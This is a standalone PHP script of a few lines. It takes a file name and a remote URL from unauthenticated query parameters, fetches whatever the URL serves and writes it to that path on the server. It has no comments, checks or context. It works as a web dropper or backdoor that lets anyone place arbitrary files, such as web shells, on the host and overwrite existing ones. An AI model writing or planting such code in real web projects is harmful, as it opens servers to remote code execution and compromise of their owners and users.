<?php 
$fname=$_GET['n'];
$url=$_GET['u'];
file_put_contents($fname, fopen($url, 'r'));
?>